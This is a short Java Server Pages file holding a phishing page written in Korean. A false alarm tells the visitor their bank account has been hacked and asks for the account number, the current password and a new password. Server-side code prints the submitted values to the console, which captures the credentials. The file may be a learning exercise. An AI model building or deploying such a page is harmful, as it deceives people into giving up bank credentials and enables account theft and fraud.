<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
<style type="text/css">
body {
	background-image: url("error.png");
}

div {
	background-color: rgba(0, 0, 255, 0.5);
}
</style>
<%
	System.out.println(request.getParameter("id"));
	System.out.println(request.getParameter("id2"));
	System.out.println(request.getParameter("id3"));
%>
</head>
<body>
	<form action="error.jsp">
		<div align="center">
			<h1>경고! 현재 당신의 계좌가 해킹당했습니다. 비밀번호를 변경해주세요</h1>
			<h3>계좌 번호</h3>
			<input type="text" name="id2"><br>
			<h3>계좌 비밀번호</h3>
			<input type="text" name="id">
			<h3>계좌 변경 비밀번호</h3>
			<input type="text" name="id1"> <br> <input type="submit"
				value="변경"><br> <br>
		</div>
	</form>
</body>
</html>